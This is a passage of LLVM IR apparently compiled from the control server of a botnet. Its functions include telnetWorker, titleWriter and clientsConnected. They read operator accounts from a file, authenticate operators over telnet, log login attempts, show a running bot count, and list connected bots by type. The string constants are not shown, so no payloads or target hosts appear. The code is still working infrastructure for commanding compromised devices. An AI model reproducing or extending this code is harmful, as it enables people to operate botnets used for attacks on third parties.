  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8* noundef, i8* noundef) #1

declare i8* @fgets(i8* noundef, i32 noundef, %struct._IO_FILE* noundef) #1

declare i32 @fclose(%struct._IO_FILE* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @client_addr(i64 %0, i64 %1) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %5 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 0
  store i64 %0, i64* %5, align 4
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %4, i32 0, i32 1
  store i64 %1, i64* %6, align 4
  %7 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %7, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = and i32 %9, 255
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %12 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %11, i32 0, i32 0
  %13 = load i32, i32* %12, align 4
  %14 = and i32 %13, 65280
  %15 = lshr i32 %14, 8
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  %18 = load i32, i32* %17, align 4
  %19 = and i32 %18, 16711680
  %20 = lshr i32 %19, 16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  %24 = and i32 %23, -16777216
  %25 = lshr i32 %24, 24
  %26 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.17, i64 0, i64 0), i32 noundef %10, i32 noundef %15, i32 noundef %20, i32 noundef %25)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @hostname_to_ip(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* noundef %9)
  store %struct.hostent* %10, %struct.hostent** %6, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  call void @herror(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0)) #11
  store i32 1, i32* %3, align 4
  br label %40

13:                                               ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %6, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = bitcast i8** %16 to %struct.in_addr**
  store %struct.in_addr** %17, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  br label %18

18:                                               ; preds = %36, %13
  %19 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %19, i64 %21
  %23 = load %struct.in_addr*, %struct.in_addr** %22, align 8
  %24 = icmp ne %struct.in_addr* %23, null
  br i1 %24, label %25, label %39

25:                                               ; preds = %18
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %27, i64 %29
  %31 = load %struct.in_addr*, %struct.in_addr** %30, align 8
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = call i8* @inet_ntoa(i32 %33) #11
  %35 = call i8* @strcpy(i8* noundef %26, i8* noundef %34) #11
  store i32 0, i32* %3, align 4
  br label %40

36:                                               ; No predecessors!
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  br label %18, !llvm.loop !21

39:                                               ; preds = %18
  store i32 1, i32* %3, align 4
  br label %40

40:                                               ; preds = %39, %25, %12
  %41 = load i32, i32* %3, align 4
  ret i32 %41
}

declare %struct.hostent* @gethostbyname(i8* noundef) #1

; Function Attrs: nounwind
declare void @herror(i8* noundef) #4

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @titleWriter(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  %5 = alloca [4 x i8*], align 16
  %6 = alloca i32, align 4
  %7 = alloca [1000 x i8], align 16
  store i8* %0, i8** %2, align 8
  %8 = load i8*, i8** %2, align 8
  %9 = ptrtoint i8* %8 to i64
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %3, align 4
  %11 = bitcast [4 x i8*]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 bitcast ([4 x i8*]* @__const.titleWriter.spinbuf to i8*), i64 32, i1 false)
  %12 = bitcast [1000 x i8]* %7 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %12, i8 0, i64 1000, i1 false)
  br label %13

13:                                               ; preds = %40, %1
  store i32 0, i32* %6, align 4
  br label %14

14:                                               ; preds = %37, %13
  %15 = load i32, i32* %6, align 4
  %16 = sext i32 %15 to i64
  %17 = icmp ult i64 %16, 4
  br i1 %17, label %18, label %40

18:                                               ; preds = %14
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %19, i8 0, i64 2048, i1 false)
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %21 = call i32 @clientsConnected()
  %22 = load i32, i32* %6, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [4 x i8*], [4 x i8*]* %5, i64 0, i64 %23
  %25 = load i8*, i8** %24, align 8
  %26 = getelementptr inbounds [1000 x i8], [1000 x i8]* %7, i64 0, i64 0
  %27 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %20, i8* noundef getelementptr inbounds ([35 x i8], [35 x i8]* @.str.23, i64 0, i64 0), i32 noundef 27, i32 noundef %21, i8* noundef %25, i8* noundef %26, i32 noundef 7) #11
  %28 = load i32, i32* %3, align 4
  %29 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %31 = call i64 @strlen(i8* noundef %30) #9
  %32 = call i64 @send(i32 noundef %28, i8* noundef %29, i64 noundef %31, i32 noundef 16384)
  %33 = icmp eq i64 %32, -1
  br i1 %33, label %34, label %35

34:                                               ; preds = %18
  br label %35

35:                                               ; preds = %34, %18
  %36 = call i32 @sleep(i32 noundef 1)
  br label %37

37:                                               ; preds = %35
  %38 = load i32, i32* %6, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %6, align 4
  br label %14, !llvm.loop !22

40:                                               ; preds = %14
  br label %13
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #6

declare i32 @sleep(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @telnetWorker(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca %struct._IO_FILE*, align 8
  %23 = alloca %struct._IO_FILE*, align 8
  %24 = alloca [80 x i8], align 16
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca [512 x i8], align 16
  %28 = alloca [512 x i8], align 16
  %29 = alloca [100 x i8*], align 16
  %30 = alloca i8*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca %struct._IO_FILE*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca [20 x i8], align 16
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca [50 x i8*], align 16
  %43 = alloca %struct._IO_FILE*, align 8
  %44 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %45 = load i8*, i8** %3, align 8
  %46 = ptrtoint i8* %45 to i64
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %4, align 4
  %48 = load volatile i32, i32* @managesConnected, align 4
  %49 = add nsw i32 %48, 1
  store volatile i32 %49, i32* @managesConnected, align 4
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %50, i8 0, i64 2048, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8** %12, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8** %13, align 8
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0), i8** %14, align 8
  store i32 0, i32* %16, align 4
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %51, i8 0, i64 2048, i1 false)
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %52, i8 0, i64 2048, i1 false)
  store i32 0, i32* %19, align 4
  %53 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  store %struct._IO_FILE* %53, %struct._IO_FILE** %18, align 8
  br label %54

54:                                               ; preds = %59, %1
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %56 = call i32 @feof(%struct._IO_FILE* noundef %55) #11
  %57 = icmp ne i32 %56, 0
  %58 = xor i1 %57, true
  br i1 %58, label %59, label %64

59:                                               ; preds = %54
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %61 = call i32 @fgetc(%struct._IO_FILE* noundef %60)
  store i32 %61, i32* %20, align 4
  %62 = load i32, i32* %19, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %19, align 4
  br label %54, !llvm.loop !23

64:                                               ; preds = %54
  store i32 0, i32* %21, align 4
  %65 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  call void @rewind(%struct._IO_FILE* noundef %65)
  br label %66

66:                                               ; preds = %71, %64
  %67 = load i32, i32* %21, align 4
  %68 = load i32, i32* %19, align 4
  %69 = sub nsw i32 %68, 1
  %70 = icmp ne i32 %67, %69
  br i1 %70, label %71, label %91

71:                                               ; preds = %66
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %73 = load i32, i32* %21, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %74
  %76 = getelementptr inbounds %struct.account, %struct.account* %75, i32 0, i32 0
  %77 = getelementptr inbounds [200 x i8], [200 x i8]* %76, i64 0, i64 0
  %78 = load i32, i32* %21, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %79
  %81 = getelementptr inbounds %struct.account, %struct.account* %80, i32 0, i32 1
  %82 = getelementptr inbounds [200 x i8], [200 x i8]* %81, i64 0, i64 0
  %83 = load i32, i32* %21, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %84
  %86 = getelementptr inbounds %struct.account, %struct.account* %85, i32 0, i32 2
  %87 = getelementptr inbounds [200 x i8], [200 x i8]* %86, i64 0, i64 0
  %88 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* noundef %72, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i8* noundef %77, i8* noundef %82, i8* noundef %87)
  %89 = load i32, i32* %21, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %21, align 4
  br label %66, !llvm.loop !24

91:                                               ; preds = %66
  %92 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %93 = load i32, i32* %4, align 4
  %94 = call i32 @fdgets(i8* noundef %92, i32 noundef 2048, i32 noundef %93)
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %96, label %97

96:                                               ; preds = %91
  br label %960

97:                                               ; preds = %91
  %98 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %99 = load i8*, i8** %14, align 8
  %100 = call i8* @strstr(i8* noundef %98, i8* noundef %99) #9
  %101 = icmp ne i8* %100, null
  br i1 %101, label %102, label %103

102:                                              ; preds = %97
  br label %104

103:                                              ; preds = %97
  br label %960

104:                                              ; preds = %102
  %105 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %106 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %105, i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i64 0, i64 0)) #11
  %107 = load i32, i32* %4, align 4
  %108 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %109 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %110 = call i64 @strlen(i8* noundef %109) #9
  %111 = call i64 @send(i32 noundef %107, i8* noundef %108, i64 noundef %110, i32 noundef 16384)
  %112 = icmp eq i64 %111, -1
  br i1 %112, label %113, label %114

113:                                              ; preds = %104
  br label %960

114:                                              ; preds = %104
  %115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %116 = load i32, i32* %4, align 4
  %117 = call i32 @fdgets(i8* noundef %115, i32 noundef 2048, i32 noundef %116)
  %118 = icmp slt i32 %117, 1
  br i1 %118, label %119, label %120

119:                                              ; preds = %114
  br label %960

120:                                              ; preds = %114
  %121 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* noundef %121)
  %122 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %124 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %122, i8* noundef %123) #11
  %125 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  store i8* %125, i8** %9, align 8
  %126 = load i8*, i8** %9, align 8
  %127 = call i32 @Search_in_File(i8* noundef %126)
  store i32 %127, i32* %5, align 4
  %128 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %128, %struct._IO_FILE** %22, align 8
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %130 = load i8*, i8** %9, align 8
  %131 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %129, i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* noundef %130)
  %132 = load %struct._IO_FILE*, %struct._IO_FILE** %22, align 8
  %133 = call i32 @fclose(%struct._IO_FILE* noundef %132)
  %134 = load i8*, i8** %9, align 8
  %135 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* noundef %134)
  %136 = load i8*, i8** %9, align 8
  %137 = load i32, i32* %5, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %138
  %140 = getelementptr inbounds %struct.account, %struct.account* %139, i32 0, i32 0
  %141 = getelementptr inbounds [200 x i8], [200 x i8]* %140, i64 0, i64 0
  %142 = call i32 @strcmp(i8* noundef %136, i8* noundef %141) #9
  %143 = icmp eq i32 %142, 0
  br i1 %143, label %144, label %173

144:                                              ; preds = %120
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %146 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %145, i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i64 0, i64 0)) #11
  %147 = load i32, i32* %4, align 4
  %148 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %150 = call i64 @strlen(i8* noundef %149) #9
  %151 = call i64 @send(i32 noundef %147, i8* noundef %148, i64 noundef %150, i32 noundef 16384)
  %152 = icmp eq i64 %151, -1
  br i1 %152, label %153, label %154

153:                                              ; preds = %144
  br label %960

154:                                              ; preds = %144
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %156 = load i32, i32* %4, align 4
  %157 = call i32 @fdgets(i8* noundef %155, i32 noundef 2048, i32 noundef %156)
  %158 = icmp slt i32 %157, 1
  br i1 %158, label %159, label %160

159:                                              ; preds = %154
  br label %960

160:                                              ; preds = %154
  %161 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* noundef %161)
  %162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %164
  %166 = getelementptr inbounds %struct.account, %struct.account* %165, i32 0, i32 1
  %167 = getelementptr inbounds [200 x i8], [200 x i8]* %166, i64 0, i64 0
  %168 = call i32 @strcmp(i8* noundef %162, i8* noundef %167) #9
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %170, label %171

170:                                              ; preds = %160
  br label %174

171:                                              ; preds = %160
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %172, i8 0, i64 2048, i1 false)
  br label %186

173:                                              ; preds = %120
  br label %174

174:                                              ; preds = %173, %170
  %175 = load i32, i32* %4, align 4
  %176 = call i64 @send(i32 noundef %175, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %177 = icmp eq i64 %176, -1
  br i1 %177, label %178, label %179

178:                                              ; preds = %174
  br label %960

179:                                              ; preds = %174
  %180 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %180, %struct._IO_FILE** %23, align 8
  %181 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %182 = load i8*, i8** %9, align 8
  %183 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %181, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0), i8* noundef %182)
  %184 = load %struct._IO_FILE*, %struct._IO_FILE** %23, align 8
  %185 = call i32 @fclose(%struct._IO_FILE* noundef %184)
  br label %960

186:                                              ; preds = %171
  %187 = load i32, i32* %4, align 4
  %188 = call i64 @send(i32 noundef %187, i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 noundef 14, i32 noundef 16384)
  %189 = icmp eq i64 %188, -1
  br i1 %189, label %190, label %191

190:                                              ; preds = %186
  br label %960

191:                                              ; preds = %186
  %192 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %193 = load i32, i32* %5, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %194
  %196 = getelementptr inbounds %struct.account, %struct.account* %195, i32 0, i32 0
  %197 = getelementptr inbounds [200 x i8], [200 x i8]* %196, i64 0, i64 0
  %198 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %192, i8* noundef getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i64 0, i64 0), i8* noundef %197) #11
  %199 = load i32, i32* %4, align 4
  %200 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %201 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %202 = call i64 @strlen(i8* noundef %201) #9
  %203 = call i64 @send(i32 noundef %199, i8* noundef %200, i64 noundef %202, i32 noundef 16384)
  %204 = icmp eq i64 %203, -1
  br i1 %204, label %205, label %206

205:                                              ; preds = %191
  br label %960

206:                                              ; preds = %191
  %207 = load i8*, i8** %3, align 8
  %208 = call i32 @pthread_create(i64* noundef %6, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @titleWriter, i8* noundef %207) #11
  %209 = load i32, i32* %4, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %210
  %212 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %211, i32 0, i32 2
  %213 = getelementptr inbounds [20 x i8], [20 x i8]* %212, i64 0, i64 0
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %215
  %217 = getelementptr inbounds %struct.account, %struct.account* %216, i32 0, i32 0
  %218 = getelementptr inbounds [200 x i8], [200 x i8]* %217, i64 0, i64 0
  %219 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %213, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i64 0, i64 0), i8* noundef %218) #11
  %220 = load i32, i32* %4, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %221
  %223 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %222, i32 0, i32 1
  store i32 1, i32* %223, align 4
  br label %224

224:                                              ; preds = %936, %935, %206
  %225 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %226 = load i32, i32* %4, align 4
  %227 = call i32 @fdgets(i8* noundef %225, i32 noundef 2048, i32 noundef %226)
  %228 = icmp sgt i32 %227, 0
  br i1 %228, label %229, label %959

229:                                              ; preds = %224
  %230 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %231 = call i8* @strstr(i8* noundef %230, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i64 0, i64 0)) #9
  %232 = icmp ne i8* %231, null
  br i1 %232, label %241, label %233

233:                                              ; preds = %229
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %235 = call i8* @strstr(i8* noundef %234, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i64 0, i64 0)) #9
  %236 = icmp ne i8* %235, null
  br i1 %236, label %241, label %237

237:                                              ; preds = %233
  %238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %239 = call i8* @strstr(i8* noundef %238, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i64 0, i64 0)) #9
  %240 = icmp ne i8* %239, null
  br i1 %240, label %241, label %305

241:                                              ; preds = %237, %233, %229
  %242 = call i32 @joinn()
  store i32 1, i32* %26, align 4
  store i32 0, i32* %25, align 4
  br label %243

243:                                              ; preds = %290, %241
  %244 = load i32, i32* %25, align 4
  %245 = icmp slt i32 %244, 40
  br i1 %245, label %246, label %293

246:                                              ; preds = %243
  %247 = load i32, i32* %25, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %248
  %250 = getelementptr inbounds %struct.name, %struct.name* %249, i32 0, i32 1
  %251 = load i32, i32* %250, align 4
  %252 = icmp sle i32 %251, 0
  br i1 %252, label %253, label %259

253:                                              ; preds = %246
  %254 = load i32, i32* %25, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %255
  %257 = getelementptr inbounds %struct.name, %struct.name* %256, i32 0, i32 0
  %258 = getelementptr inbounds [512 x i8], [512 x i8]* %257, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %258, i8 0, i64 512, i1 false)
  br label %259

259:                                              ; preds = %253, %246
  %260 = load i32, i32* %25, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %261
  %263 = getelementptr inbounds %struct.name, %struct.name* %262, i32 0, i32 0
  %264 = getelementptr inbounds [512 x i8], [512 x i8]* %263, i64 0, i64 0
  %265 = call i64 @strlen(i8* noundef %264) #9
  %266 = icmp uge i64 %265, 1
  br i1 %266, label %267, label %289

267:                                              ; preds = %259
  %268 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i64 0, i64 0
  %269 = load i32, i32* %25, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %270
  %272 = getelementptr inbounds %struct.name, %struct.name* %271, i32 0, i32 0
  %273 = getelementptr inbounds [512 x i8], [512 x i8]* %272, i64 0, i64 0
  %274 = load i32, i32* %25, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %275
  %277 = getelementptr inbounds %struct.name, %struct.name* %276, i32 0, i32 1
  %278 = load i32, i32* %277, align 4
  %279 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %268, i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i64 0, i64 0), i8* noundef %273, i32 noundef %278) #11
  %280 = load i32, i32* %4, align 4
  %281 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i64 0, i64 0
  %282 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i64 0, i64 0
  %283 = call i64 @strlen(i8* noundef %282) #9
  %284 = call i64 @send(i32 noundef %280, i8* noundef %281, i64 noundef %283, i32 noundef 16384)
  %285 = icmp eq i64 %284, -1
  br i1 %285, label %286, label %287

286:                                              ; preds = %267
  br label %960

287:                                              ; preds = %267
  %288 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %288, i8 0, i64 512, i1 false)
  br label %289

289:                                              ; preds = %287, %259
  br label %290

290:                                              ; preds = %289
  %291 = load i32, i32* %25, align 4
  %292 = add nsw i32 %291, 1
  store i32 %292, i32* %25, align 4
  br label %243, !llvm.loop !25

293:                                              ; preds = %243
  %294 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i64 0, i64 0
  %295 = call i32 @clientsConnected()
  %296 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %294, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i64 0, i64 0), i32 noundef %295) #11
  %297 = load i32, i32* %4, align 4
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i64 0, i64 0
  %299 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i64 0, i64 0
  %300 = call i64 @strlen(i8* noundef %299) #9
  %301 = call i64 @send(i32 noundef %297, i8* noundef %298, i64 noundef %300, i32 noundef 16384)
  %302 = icmp eq i64 %301, -1
  br i1 %302, label %303, label %304

303:                                              ; preds = %293
  br label %960

304:                                              ; preds = %293
  br label %305

305:                                              ; preds = %304, %237
  %306 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %307 = call i8* @strstr(i8* noundef %306, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i64 0, i64 0)) #9
  %308 = icmp ne i8* %307, null
